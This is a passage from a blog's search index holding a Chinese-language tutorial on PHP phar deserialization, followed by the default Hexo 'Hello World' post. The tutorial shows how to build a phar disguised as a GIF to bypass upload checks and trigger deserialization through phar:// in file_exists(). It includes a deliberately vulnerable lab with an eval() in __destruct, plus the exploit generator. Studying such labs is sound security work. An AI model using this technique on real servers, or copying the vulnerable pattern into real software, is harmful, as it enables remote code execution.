<li><p>本地生成一个phar文件，要想使用Phar类里的方法来处理相关操作，必须将php.ini中的phar.readonly配置项配置为0或Off。 </p>
</li>
<li><p>PHP内置phar类，其他的一些方法如下：</p>
<ul>
<li>$phar = new Phar(‘sdpc.phar’); //实例一个phar对象供后续操作  $phar-&gt;startBuffering() //开始缓冲Phar写操作  $phar-&gt;setStub(“<?php __HALT_COMPILER(); ?>“); //设置stub $phar-&gt;addFromString(‘test.php’,’&lt;?php echo ‘this is test file’;’); //以字符串的形式添加一个文件到 phar 档案  $phar-&gt;buildFromDirectory(‘fileTophar’) //把一个fileTophar目录下的文件归档到phar档案 $phar-&gt;extractTo() //该函数解压一个phar包，extractTo()提取phar文档内容 </li>
</ul>
</li>
<li><p>漏洞剖析： </p>
</li>
<li><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些文件操作函数执行的参数可控时，我们在参数部分利用Phar伪协议，可以不依赖unserialize() 直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。 </p>
</li>
<li><p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过+执行的方法。 </p>
</li>
<li><p>phar怎么用？</p>
<ul>
<li><p>phar.php：</p>
</li>
<li><p>```php</p>
<?php class TestObject{
}  
$phar = new Phar("phar.phar");    //实例一个phar对象供后续操作  
$phar -> startBuffering();   //开始缓冲对phar的写操作 
$phar -> setStub("<?php __HALT_COMPILER();?><p>“);    //设置识别phar拓展的标识stub<br>$o = new TestObject();<br>$o -&gt; data = ‘h4ck3r’;<br>$phar -&gt; setMetadata($o);      //将自定义的归档元数据meta-data存入manifest<br>$phar -&gt; addFromString(“test.txt”,”test”);     //添加要压缩的文件 //签名自动计算<br>$phar -&gt; stopBuffering();    //停止缓冲对phar的写操作 ?&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![img](https://api2.mubu.com/v3/document_image/b1f7fdd3-cd9b-414a-bc52-582e4332074e-12072792.jpg)</span><br><span class="line"></span><br><span class="line">- ![img](https://api2.mubu.com/v3/document_image/892c4963-f6a5-4601-bd32-bb5a5f0ba64b-12072792.jpg)</span><br><span class="line"></span><br><span class="line">- ![img](https://api2.mubu.com/v3/document_image/316f7a5f-4aaf-4529-b86e-becaa80870b8-12072792.jpg)</span><br><span class="line"></span><br><span class="line">##### 将phar伪造成其他格式的文件</span><br><span class="line"></span><br><span class="line">- 在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加 任意的文件头 + 修改后缀名 的方式将phar文件伪装成其他格式的文件。基本操作：</span><br><span class="line"></span><br><span class="line">  ```php</span><br><span class="line">  &lt;?php    </span><br><span class="line">      class TestObject &#123;  </span><br><span class="line">      </span><br><span class="line">        &#125;    </span><br><span class="line">        $phar = new Phar(&#x27;phar.phar&#x27;);   </span><br><span class="line">        $phar -&gt; startBuffering();   </span><br><span class="line">        $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);   //设置stub，增加gif文件头    </span><br><span class="line">        $phar -&gt;addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);  //添加要压缩的文件    </span><br><span class="line">        $object = new TestObject();   </span><br><span class="line">        $object -&gt; data = &#x27;hu3sky&#x27;;    </span><br><span class="line">        $phar -&gt; setMetadata($object);  //将自定义meta-data存入manifest    </span><br><span class="line">        $phar -&gt; stopBuffering(); </span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>采取这种方式可以绕过很大一部分上传检测。</p>
</li>
</ul>
<h6 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h6><ul>
<li><p>phar文件要能够上传到服务器端（如GET、POST），并且要有file_exists()，fopen()，file_get_contents()，file()，include()等文件操作的函数</p>
</li>
<li><p>要有可用的魔术方法作为“跳板”</p>
</li>
<li><p>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
</li>
<li><p>漏洞复现环境：</p>
<ul>
<li><p>upload_file.php，后端检测文件上传，检测文件类型是否为gif，文件后缀名是否为gif</p>
<ul>
<li>```php<?php +
if (($_FILES["file"]["type"]=="image/gif")&&(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.')+1))== 'gif') {    
    echo "Upload: " . $_FILES["file"]["name"];   
    echo "Type: " . $_FILES["file"]["type"];    
    echo "Temp file: " . $_FILES["file"]["tmp_name"];     
   
    if (file_exists("upload_file/" . $_FILES["file"]["name"]))     
    {  
        echo $_FILES["file"]["name"] . " already exists. "; 
    }   
    else     
    {      
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload_file/" .$_FILES["file"]["name"]);      
        echo "Stored in: " . "upload_file/" . $_FILES["file"]["name"];    
    }   
  } 
  else  
  {  
    echo "Invalid file,you can only upload gif"; 
  }
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- upload_file.html，前端文件上传表单</span><br><span class="line"></span><br><span class="line">  - ```html</span><br><span class="line">    &lt;body&gt; </span><br><span class="line">    &lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;   </span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    </span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt; </span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>file_un.php，存在file_exists()，并且存在__destruct()</p>
</li>
<li><p>```php</p>
<?php 
$filename=$_GET['filename']; 
class AnyClass{ 
    var $output = 'echo "ok";';    
    function __destruct()  
    {        
        eval($this -> output);   
    } 
}
file_exists($filename);   // 漏洞点 
?>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 实现过程：</span><br><span class="line"></span><br><span class="line">  - 首先是根据file_un.php写一个生成phar的php文件，当然需要绕过为gif的限制，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</span><br><span class="line"></span><br><span class="line">  - 构造代码：</span><br><span class="line"></span><br><span class="line">    - eval.php：</span><br><span class="line"></span><br><span class="line">    - ```php</span><br><span class="line">      &lt;?php</span><br><span class="line">      class AnyClass&#123;</span><br><span class="line">      var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">      function __destruct()</span><br><span class="line">      &#123;</span><br><span class="line">         eval($this -&gt; output);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      $phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">      $phar -&gt; startBuffering();</span><br><span class="line">      $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">      $phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">      $object = new AnyClass();</span><br><span class="line">      $object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class="line">      $phar -&gt; setMetadata($object);</span><br><span class="line">      $phar -&gt; stopBuffering();</span><br><span class="line">      ?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://api2.mubu.com/v3/document_image/74fd31be-5d8f-4613-b17a-924fb5d39662-12072792.jpg" alt="img"></p>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/9fac7837-a3c8-4462-a534-547239b5e98b-12072792.jpg" alt="img"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/05/20/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
